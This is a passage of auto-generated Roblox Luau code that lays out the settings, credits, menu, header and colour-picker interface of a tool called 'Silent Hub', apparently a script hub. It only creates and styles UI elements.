G2L["33"] = Instance.new("ScrollingFrame", G2L["5"]);
G2L["33"]["Visible"] = false;
G2L["33"]["Active"] = true;
G2L["33"]["BorderSizePixel"] = 0;
G2L["33"]["CanvasSize"] = UDim2.new(0, 0, 0, 0);
G2L["33"]["ScrollingEnabled"] = false;
G2L["33"]["Name"] = [[Settings]];
G2L["33"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["33"]["Size"] = UDim2.new(0, 486, 0, 257);
G2L["33"]["Position"] = UDim2.new(0.1791, 0, 0.0293, 0);
G2L["33"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["33"]["ScrollBarThickness"] = 5;
G2L["33"]["BackgroundTransparency"] = 0.95;

-- Tags
CollectionService:AddTag(G2L["33"], [[page]]);

-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Settings.ButtonContainer
G2L["34"] = Instance.new("Frame", G2L["33"]);
G2L["34"]["BorderSizePixel"] = 0;
G2L["34"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["34"]["Size"] = UDim2.new(0, 486, 0, 69);
G2L["34"]["Position"] = UDim2.new(0, 0, 0.73152, 0);
G2L["34"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["34"]["Name"] = [[ButtonContainer]];
G2L["34"]["BackgroundTransparency"] = 1;


-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Settings.ButtonContainer.SaveSettings
G2L["35"] = Instance.new("TextButton", G2L["34"]);
G2L["35"]["BorderSizePixel"] = 0;
G2L["35"]["TextSize"] = 14;
G2L["35"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["35"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["35"]["FontFace"] = Font.new([[rbxassetid://16658221428]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["35"]["BackgroundTransparency"] = 0.95;
G2L["35"]["Size"] = UDim2.new(0, 206, 0, 45);
G2L["35"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["35"]["Text"] = [[Save Settings]];
G2L["35"]["Name"] = [[SaveSettings]];
G2L["35"]["Position"] = UDim2.new(-0.45504, 0, 0.17391, 0);


-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Settings.ButtonContainer.UIListLayout
G2L["36"] = Instance.new("UIListLayout", G2L["34"]);
G2L["36"]["HorizontalAlignment"] = Enum.HorizontalAlignment.Center;
G2L["36"]["HorizontalFlex"] = Enum.UIFlexAlignment.SpaceAround;
G2L["36"]["VerticalFlex"] = Enum.UIFlexAlignment.SpaceAround;
G2L["36"]["Padding"] = UDim.new(0.05, 0);
G2L["36"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
G2L["36"]["FillDirection"] = Enum.FillDirection.Horizontal;


-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Settings.ButtonContainer.ResetSettings
G2L["37"] = Instance.new("TextButton", G2L["34"]);
G2L["37"]["BorderSizePixel"] = 0;
G2L["37"]["TextSize"] = 14;
G2L["37"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["37"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["37"]["FontFace"] = Font.new([[rbxassetid://16658221428]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["37"]["BackgroundTransparency"] = 0.95;
G2L["37"]["Size"] = UDim2.new(0, 206, 0, 45);
G2L["37"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["37"]["Text"] = [[Reset Settings]];
G2L["37"]["Name"] = [[ResetSettings]];
G2L["37"]["Position"] = UDim2.new(-0.00815, 0, 0.17391, 0);


-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Settings.Button2Container
G2L["38"] = Instance.new("Frame", G2L["33"]);
G2L["38"]["BorderSizePixel"] = 0;
G2L["38"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["38"]["Size"] = UDim2.new(0, 486, 0, 69);
G2L["38"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["38"]["Name"] = [[Button2Container]];
G2L["38"]["BackgroundTransparency"] = 1;


-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Settings.Button2Container.UIListLayout
G2L["39"] = Instance.new("UIListLayout", G2L["38"]);
G2L["39"]["HorizontalAlignment"] = Enum.HorizontalAlignment.Center;
G2L["39"]["HorizontalFlex"] = Enum.UIFlexAlignment.SpaceAround;
G2L["39"]["VerticalFlex"] = Enum.UIFlexAlignment.SpaceAround;
G2L["39"]["Padding"] = UDim.new(0.05, 0);
G2L["39"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
G2L["39"]["FillDirection"] = Enum.FillDirection.Horizontal;


-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Settings.Button2Container.ColorPicker
G2L["3a"] = Instance.new("TextButton", G2L["38"]);
G2L["3a"]["BorderSizePixel"] = 0;
G2L["3a"]["TextSize"] = 14;
G2L["3a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3a"]["FontFace"] = Font.new([[rbxassetid://16658221428]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["3a"]["BackgroundTransparency"] = 0.95;
G2L["3a"]["Size"] = UDim2.new(0, 206, 0, 45);
G2L["3a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3a"]["Text"] = [[Color Picker]];
G2L["3a"]["Name"] = [[ColorPicker]];
G2L["3a"]["Position"] = UDim2.new(-0.45504, 0, 0.17391, 0);


-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Settings.Button2Container.ColorPicker.LocalScript
G2L["3b"] = Instance.new("LocalScript", G2L["3a"]);



-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Settings.Button2Container.PickerBackgroundToggle
G2L["3c"] = Instance.new("TextButton", G2L["38"]);
G2L["3c"]["BorderSizePixel"] = 0;
G2L["3c"]["TextSize"] = 14;
G2L["3c"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3c"]["FontFace"] = Font.new([[rbxassetid://16658221428]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["3c"]["BackgroundTransparency"] = 0.95;
G2L["3c"]["Size"] = UDim2.new(0, 206, 0, 45);
G2L["3c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3c"]["Text"] = [[Change Picker Background]];
G2L["3c"]["Name"] = [[PickerBackgroundToggle]];
G2L["3c"]["Position"] = UDim2.new(-0.45504, 0, 0.17391, 0);


-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Settings.Button2Container.PickerBackgroundToggle.LocalScript
G2L["3d"] = Instance.new("LocalScript", G2L["3c"]);



-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Settings.ScaleContainer
G2L["3e"] = Instance.new("Frame", G2L["33"]);
G2L["3e"]["BorderSizePixel"] = 0;
G2L["3e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3e"]["Size"] = UDim2.new(0, 486, 0, 69);
G2L["3e"]["Position"] = UDim2.new(0, 0, 0.249, 0);
G2L["3e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3e"]["Name"] = [[ScaleContainer]];
G2L["3e"]["BackgroundTransparency"] = 1;


-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Settings.ScaleContainer.UIListLayout
G2L["3f"] = Instance.new("UIListLayout", G2L["3e"]);
G2L["3f"]["HorizontalAlignment"] = Enum.HorizontalAlignment.Center;
G2L["3f"]["HorizontalFlex"] = Enum.UIFlexAlignment.SpaceAround;
G2L["3f"]["VerticalFlex"] = Enum.UIFlexAlignment.SpaceAround;
G2L["3f"]["Padding"] = UDim.new(0.05, 0);
G2L["3f"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
G2L["3f"]["FillDirection"] = Enum.FillDirection.Horizontal;


-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Settings.ScaleContainer.Scale
G2L["40"] = Instance.new("TextBox", G2L["3e"]);
G2L["40"]["Name"] = [[Scale]];
G2L["40"]["PlaceholderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["40"]["BorderSizePixel"] = 0;
G2L["40"]["TextWrapped"] = true;
G2L["40"]["TextSize"] = 14;
G2L["40"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["40"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["40"]["FontFace"] = Font.new([[rbxassetid://16658221428]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["40"]["PlaceholderText"] = [[Scale]];
G2L["40"]["Size"] = UDim2.new(0, 452, 0, 45);
G2L["40"]["Position"] = UDim2.new(0.01646, 0, 0.02015, 0);
G2L["40"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["40"]["Text"] = [[]];
G2L["40"]["BackgroundTransparency"] = 0.95;


-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Settings.ScaleContainer.Scale.LocalScript
G2L["41"] = Instance.new("LocalScript", G2L["40"]);



-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Settings.RainbowContainer
G2L["42"] = Instance.new("Frame", G2L["33"]);
G2L["42"]["BorderSizePixel"] = 0;
G2L["42"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["42"]["Size"] = UDim2.new(0, 486, 0, 69);
G2L["42"]["Position"] = UDim2.new(0, 0, 0.48, 0);
G2L["42"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["42"]["Name"] = [[RainbowContainer]];
G2L["42"]["BackgroundTransparency"] = 1;


-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Settings.RainbowContainer.UIListLayout
G2L["43"] = Instance.new("UIListLayout", G2L["42"]);
G2L["43"]["HorizontalAlignment"] = Enum.HorizontalAlignment.Center;
G2L["43"]["HorizontalFlex"] = Enum.UIFlexAlignment.SpaceAround;
G2L["43"]["VerticalFlex"] = Enum.UIFlexAlignment.SpaceAround;
G2L["43"]["Padding"] = UDim.new(0.05, 0);
G2L["43"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
G2L["43"]["FillDirection"] = Enum.FillDirection.Horizontal;


-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Settings.RainbowContainer.Rainbow
G2L["44"] = Instance.new("TextButton", G2L["42"]);
G2L["44"]["BorderSizePixel"] = 0;
G2L["44"]["TextSize"] = 14;
G2L["44"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["44"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["44"]["FontFace"] = Font.new([[rbxassetid://16658221428]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["44"]["BackgroundTransparency"] = 0.95;
G2L["44"]["Size"] = UDim2.new(0, 452, 0, 45);
G2L["44"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["44"]["Text"] = [[Rainbow Background]];
G2L["44"]["Name"] = [[Rainbow]];
G2L["44"]["Position"] = UDim2.new(-0.45504, 0, 0.17391, 0);


-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Credits
G2L["45"] = Instance.new("ScrollingFrame", G2L["5"]);
G2L["45"]["Visible"] = false;
G2L["45"]["Active"] = true;
G2L["45"]["BorderSizePixel"] = 0;
G2L["45"]["CanvasSize"] = UDim2.new(0, 0, 0, 0);
G2L["45"]["ScrollingEnabled"] = false;
G2L["45"]["Name"] = [[Credits]];
G2L["45"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["45"]["Size"] = UDim2.new(0, 486, 0, 257);
G2L["45"]["Position"] = UDim2.new(0.1791, 0, 0.0293, 0);
G2L["45"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["45"]["ScrollBarThickness"] = 5;
G2L["45"]["BackgroundTransparency"] = 0.95;

-- Tags
CollectionService:AddTag(G2L["45"], [[page]]);

-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Credits.Credits
G2L["46"] = Instance.new("TextLabel", G2L["45"]);
G2L["46"]["TextWrapped"] = true;
G2L["46"]["BorderSizePixel"] = 0;
G2L["46"]["TextSize"] = 30;
G2L["46"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["46"]["FontFace"] = Font.new([[rbxassetid://16658221428]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["46"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["46"]["BackgroundTransparency"] = 1;
G2L["46"]["RichText"] = true;
G2L["46"]["Size"] = UDim2.new(0, 486, 0, 207);
G2L["46"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["46"]["Text"] = [[Silent Hub is developed by hyperionhax, all script credits go to their respective creators.]];
G2L["46"]["Name"] = [[Credits]];


-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Credits.Logo
G2L["47"] = Instance.new("ImageLabel", G2L["45"]);
G2L["47"]["BorderSizePixel"] = 0;
G2L["47"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["47"]["Image"] = [[rbxassetid://71596851736559]];
G2L["47"]["Size"] = UDim2.new(0, 100, 0, 100);
G2L["47"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["47"]["BackgroundTransparency"] = 1;
G2L["47"]["Name"] = [[Logo]];
G2L["47"]["Position"] = UDim2.new(0.39712, 0, 0.61089, 0);


-- StarterGui.SilentHub.UI.MainContainer.MenuContainer
G2L["48"] = Instance.new("Frame", G2L["3"]);
G2L["48"]["ZIndex"] = 2;
G2L["48"]["BorderSizePixel"] = 0;
G2L["48"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["48"]["ClipsDescendants"] = true;
G2L["48"]["Size"] = UDim2.new(0, 100, 0, 275);
G2L["48"]["Position"] = UDim2.new(0, 0, 0.12016, 0);
G2L["48"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["48"]["Name"] = [[MenuContainer]];
G2L["48"]["LayoutOrder"] = 2;
G2L["48"]["BackgroundTransparency"] = 0.95;


-- StarterGui.SilentHub.UI.MainContainer.MenuContainer.LocalScript
G2L["49"] = Instance.new("LocalScript", G2L["48"]);



-- StarterGui.SilentHub.UI.MainContainer.MenuContainer.UIListLayout
G2L["4a"] = Instance.new("UIListLayout", G2L["48"]);
G2L["4a"]["HorizontalAlignment"] = Enum.HorizontalAlignment.Center;
G2L["4a"]["HorizontalFlex"] = Enum.UIFlexAlignment.SpaceEvenly;
G2L["4a"]["Padding"] = UDim.new(0.03, 0);
G2L["4a"]["VerticalAlignment"] = Enum.VerticalAlignment.Center;
G2L["4a"]["SortOrder"] = Enum.SortOrder.LayoutOrder;


-- StarterGui.SilentHub.UI.MainContainer.MenuContainer.MenuButton
G2L["4b"] = Instance.new("TextButton", G2L["48"]);
G2L["4b"]["BorderSizePixel"] = 0;
G2L["4b"]["TextSize"] = 14;
G2L["4b"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4b"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4b"]["FontFace"] = Font.new([[rbxassetid://16658221428]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["4b"]["BackgroundTransparency"] = 1;
G2L["4b"]["Size"] = UDim2.new(0, 86, 0, 26);
G2L["4b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4b"]["Name"] = [[MenuButton]];
G2L["4b"]["Position"] = UDim2.new(-0.5, 0, 0.40842, 0);


-- StarterGui.SilentHub.UI.MainContainer.MenuContainer.MenuButton.IndicatorLine
G2L["4c"] = Instance.new("Frame", G2L["4b"]);
G2L["4c"]["BorderSizePixel"] = 0;
G2L["4c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4c"]["AnchorPoint"] = Vector2.new(0.012, 0);
G2L["4c"]["Size"] = UDim2.new(0, 86, 0.05, 0);
G2L["4c"]["Position"] = UDim2.new(0.01163, 0, 1, 0);
G2L["4c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4c"]["Name"] = [[IndicatorLine]];


-- StarterGui.SilentHub.UI.MainContainer.Header
G2L["4d"] = Instance.new("Frame", G2L["3"]);
G2L["4d"]["ZIndex"] = 3;
G2L["4d"]["BorderSizePixel"] = 0;
G2L["4d"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4d"]["Size"] = UDim2.new(0, 603, 0, 37);
G2L["4d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4d"]["Name"] = [[Header]];
G2L["4d"]["LayoutOrder"] = 3;
G2L["4d"]["BackgroundTransparency"] = 1;


-- StarterGui.SilentHub.UI.MainContainer.Header.Burger
G2L["4e"] = Instance.new("ImageButton", G2L["4d"]);
G2L["4e"]["BorderSizePixel"] = 0;
G2L["4e"]["AutoButtonColor"] = false;
G2L["4e"]["BackgroundTransparency"] = 1;
G2L["4e"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4e"]["Image"] = [[rbxassetid://8733216068]];
G2L["4e"]["Size"] = UDim2.new(0, 30, 0, 30);
G2L["4e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4e"]["Name"] = [[Burger]];
G2L["4e"]["Position"] = UDim2.new(0.01, 0, 0.1, 0);


-- StarterGui.SilentHub.UI.MainContainer.Header.Burger.LocalScript
G2L["4f"] = Instance.new("LocalScript", G2L["4e"]);



-- StarterGui.SilentHub.UI.MainContainer.Header.Minimize
G2L["50"] = Instance.new("TextButton", G2L["4d"]);
G2L["50"]["BorderSizePixel"] = 0;
G2L["50"]["TextSize"] = 30;
G2L["50"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["50"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["50"]["FontFace"] = Font.new([[rbxassetid://16658237174]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["50"]["BackgroundTransparency"] = 0.95;
G2L["50"]["Size"] = UDim2.new(0, 30, 0, 30);
G2L["50"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["50"]["Text"] = [[_]];
G2L["50"]["Name"] = [[Minimize]];
G2L["50"]["Position"] = UDim2.new(0.87, 0, 0.1, 0);


-- StarterGui.SilentHub.UI.MainContainer.Header.Minimize.LocalScript
G2L["51"] = Instance.new("LocalScript", G2L["50"]);



-- StarterGui.SilentHub.UI.MainContainer.Header.TextLabel
G2L["52"] = Instance.new("TextLabel", G2L["4d"]);
G2L["52"]["BorderSizePixel"] = 0;
G2L["52"]["TextSize"] = 20;
G2L["52"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["52"]["FontFace"] = Font.new([[rbxassetid://16658237174]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["52"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["52"]["BackgroundTransparency"] = 1;
G2L["52"]["Size"] = UDim2.new(0, 109, 0, 30);
G2L["52"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["52"]["Text"] = [[Silent Hub]];
G2L["52"]["Position"] = UDim2.new(0.40936, 0, 0.1, 0);


-- StarterGui.SilentHub.UI.MainContainer.Header.Close
G2L["53"] = Instance.new("TextButton", G2L["4d"]);
G2L["53"]["BorderSizePixel"] = 0;
G2L["53"]["TextSize"] = 30;
G2L["53"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["53"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["53"]["FontFace"] = Font.new([[rbxasset://fonts/families/Merriweather.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["53"]["BackgroundTransparency"] = 0.95;
G2L["53"]["Size"] = UDim2.new(0, 30, 0, 30);
G2L["53"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["53"]["Text"] = [[🗙]];
G2L["53"]["Name"] = [[Close]];
G2L["53"]["Position"] = UDim2.new(0.94, 0, 0.1, 0);


-- StarterGui.SilentHub.UI.MainContainer.Header.Close.LocalScript
G2L["54"] = Instance.new("LocalScript", G2L["53"]);



-- StarterGui.SilentHub.UI.MainContainer.UIScale
G2L["55"] = Instance.new("UIScale", G2L["3"]);



-- StarterGui.SilentHub.UI.Open
G2L["56"] = Instance.new("TextButton", G2L["2"]);
G2L["56"]["BorderSizePixel"] = 0;
G2L["56"]["TextSize"] = 20;
G2L["56"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["56"]["BackgroundColor3"] = Color3.fromRGB(51, 51, 51);
G2L["56"]["FontFace"] = Font.new([[rbxassetid://16658221428]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["56"]["Size"] = UDim2.new(0, 90, 0, 30);
G2L["56"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["56"]["Text"] = [[Open]];
G2L["56"]["Name"] = [[Open]];
G2L["56"]["Position"] = UDim2.new(0, 0, 0.75, 0);


-- StarterGui.SilentHub.UI.ColorPick
G2L["57"] = Instance.new("ScreenGui", G2L["2"]);
G2L["57"]["IgnoreGuiInset"] = true;
G2L["57"]["DisplayOrder"] = 1337;
G2L["57"]["Enabled"] = false;
G2L["57"]["ScreenInsets"] = Enum.ScreenInsets.DeviceSafeInsets;
G2L["57"]["Name"] = [[ColorPick]];
G2L["57"]["ResetOnSpawn"] = false;


-- StarterGui.SilentHub.UI.ColorPick.LocalScript
G2L["58"] = Instance.new("LocalScript", G2L["57"]);



-- StarterGui.SilentHub.UI.ColorPick.ColorPicker
G2L["59"] = Instance.new("Frame", G2L["57"]);
G2L["59"]["Visible"] = false;
G2L["59"]["BorderSizePixel"] = 0;
G2L["59"]["BackgroundColor3"] = Color3.fromRGB(101, 101, 101);
G2L["59"]["Size"] = UDim2.new(0, 450, 0, 330);
G2L["59"]["Position"] = UDim2.new(0.37, 0, 0.3, 0);
G2L["59"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["59"]["Name"] = [[ColorPicker]];
G2L["59"]["BackgroundTransparency"] = 1;


-- StarterGui.SilentHub.UI.ColorPick.ColorPicker.Content
G2L["5a"] = Instance.new("Frame", G2L["59"]);
G2L["5a"]["Active"] = true;
G2L["5a"]["BackgroundColor3"] = Color3.fromRGB(65, 65, 65);
G2L["5a"]["Size"] = UDim2.new(1, -2, 1, -25);
G2L["5a"]["Position"] = UDim2.new(0, 1, 0, 25);
G2L["5a"]["BorderColor3"] = Color3.fromRGB(38, 54, 55);
G2L["5a"]["Name"] = [[Content]];


-- StarterGui.SilentHub.UI.ColorPick.ColorPicker.Content.ColorLine
G2L["5b"] = Instance.new("ImageLabel", G2L["5a"]);
G2L["5b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["5b"]["Image"] = [[rbxassetid://1072518502]];
G2L["5b"]["Size"] = UDim2.new(0, 13, 0, 200);
G2L["5b"]["BorderColor3"] = Color3.fromRGB(97, 97, 97);
G2L["5b"]["Name"] = [[ColorLine]];
G2L["5b"]["Position"] = UDim2.new(1, -30, 0, 5);


-- StarterGui.SilentHub.UI.ColorPick.ColorPicker.Content.Preview
G2L["5c"] = Instance.new("Frame", G2L["5a"]);
G2L["5c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["5c"]["Size"] = UDim2.new(0, 35, 1, -245);
G2L["5c"]["Position"] = UDim2.new(1, -260, 0, 211);
G2L["5c"]["BorderColor3"] = Color3.fromRGB(97, 97, 97);
G2L["5c"]["Name"] = [[Preview]];


-- StarterGui.SilentHub.UI.ColorPick.ColorPicker.Content.ColorSpaceFrame
G2L["5d"] = Instance.new("Frame", G2L["5a"]);
G2L["5d"]["BorderSizePixel"] = 0;
G2L["5d"]["BackgroundColor3"] = Color3.fromRGB(97, 97, 97);
G2L["5d"]["ClipsDescendants"] = true;
G2L["5d"]["Size"] = UDim2.new(0, 222, 0, 202);
G2L["5d"]["Position"] = UDim2.new(1, -261, 0, 4);
G2L["5d"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["5d"]["Name"] = [[ColorSpaceFrame]];


-- StarterGui.SilentHub.UI.ColorPick.ColorPicker.Content.ColorSpaceFrame.ColorSpace
G2L["5e"] = Instance.new("ImageLabel", G2L["5d"]);
G2L["5e"]["BorderSizePixel"] = 0;
G2L["5e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["5e"]["Image"] = [[rbxassetid://1072518406]];
G2L["5e"]["Size"] = UDim2.new(0, 220, 0, 200);
G2L["5e"]["BorderColor3"] = Color3.fromRGB(97, 97, 97);
G2L["5e"]["Name"] = [[ColorSpace]];
G2L["5e"]["Position"] = UDim2.new(0, 1, 0, 1);


-- StarterGui.SilentHub.UI.ColorPick.ColorPicker.Content.ColorSpaceFrame.ColorSpace.Scope
G2L["5f"] = Instance.new("Frame", G2L["5e"]);
G2L["5f"]["BorderSizePixel"] = 0;
G2L["5f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["5f"]["Size"] = UDim2.new(0, 20, 0, 20);
G2L["5f"]["Position"] = UDim2.new(0, 210, 0, 190);
G2L["5f"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["5f"]["Name"] = [[Scope]];
G2L["5f"]["BackgroundTransparency"] = 1;


-- StarterGui.SilentHub.UI.ColorPick.ColorPicker.Content.ColorSpaceFrame.ColorSpace.Scope.Line
G2L["60"] = Instance.new("Frame", G2L["5f"]);
G2L["60"]["BorderSizePixel"] = 0;
G2L["60"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["60"]["Size"] = UDim2.new(0, 2, 0, 20);
G2L["60"]["Position"] = UDim2.new(0, 9, 0, 0);
G2L["60"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["60"]["Name"] = [[Line]];


-- StarterGui.SilentHub.UI.ColorPick.ColorPicker.Content.ColorSpaceFrame.ColorSpace.Scope.Line
G2L["61"] = Instance.new("Frame", G2L["5f"]);
G2L["61"]["BorderSizePixel"] = 0;
G2L["61"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["61"]["Size"] = UDim2.new(0, 20, 0, 2);
G2L["61"]["Position"] = UDim2.new(0, 0, 0, 9);
G2L["61"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["61"]["Name"] = [[Line]];


-- StarterGui.SilentHub.UI.ColorPick.ColorPicker.Content.ArrowFrame
G2L["62"] = Instance.new("Frame", G2L["5a"]);
G2L["62"]["BorderSizePixel"] = 0;
G2L["62"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["62"]["Size"] = UDim2.new(0, 5, 0, 208);
G2L["62"]["Position"] = UDim2.new(1, -16, 0, 1);
G2L["62"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["62"]["Name"] = [[ArrowFrame]];
G2L["62"]["BackgroundTransparency"] = 1;


-- StarterGui.SilentHub.UI.ColorPick.ColorPicker.Content.ArrowFrame.Arrow
G2L["63"] = Instance.new("Frame", G2L["62"]);
G2L["63"]["Size"] = UDim2.new(0, 8, 0, 16);
G2L["63"]["Position"] = UDim2.new(0, -2, 0, -4);
G2L["63"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["63"]["Name"] = [[Arrow]];
G2L["63"]["BackgroundTransparency"] = 1;


-- StarterGui.SilentHub.UI.ColorPick.ColorPicker.Content.ArrowFrame.Arrow.Frame
G2L["64"] = Instance.new("Frame", G2L["63"]);
G2L["64"]["BorderSizePixel"] = 0;
G2L["64"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["64"]["Size"] = UDim2.new(0, 1, 0, 1);
G2L["64"]["Position"] = UDim2.new(0, 2, 0, 8);
G2L["64"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);


-- StarterGui.SilentHub.UI.ColorPick.ColorPicker.Content.ArrowFrame.Arrow.Frame
G2L["65"] = Instance.new("Frame", G2L["63"]);
G2L["65"]["BorderSizePixel"] = 0;
G2L["65"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["65"]["Size"] = UDim2.new(0, 1, 0, 3);
G2L["65"]["Position"] = UDim2.new(0, 3, 0, 7);
G2L["65"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);


-- StarterGui.SilentHub.UI.ColorPick.ColorPicker.Content.ArrowFrame.Arrow.Frame
G2L["66"] = Instance.new("Frame", G2L["63"]);
G2L["66"]["BorderSizePixel"] = 0;
G2L["66"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["66"]["Size"] = UDim2.new(0, 1, 0, 5);
G2L["66"]["Position"] = UDim2.new(0, 4, 0, 6);
G2L["66"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);


-- StarterGui.SilentHub.UI.ColorPick.ColorPicker.Content.ArrowFrame.Arrow.Frame
G2L["67"] = Instance.new("Frame", G2L["63"]);
G2L["67"]["BorderSizePixel"] = 0;
G2L["67"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["67"]["Size"] = UDim2.new(0, 1, 0, 7);
G2L["67"]["Position"] = UDim2.new(0, 5, 0, 5);
G2L["67"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);


-- StarterGui.SilentHub.UI.ColorPick.ColorPicker.Content.ArrowFrame.Arrow.Frame
G2L["68"] = Instance.new("Frame", G2L["63"]);
G2L["68"]["BorderSizePixel"] = 0;
G2L["68"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["68"]["Size"] = UDim2.new(0, 1, 0, 9);
G2L["68"]["Position"] = UDim2.new(0, 6, 0, 4);
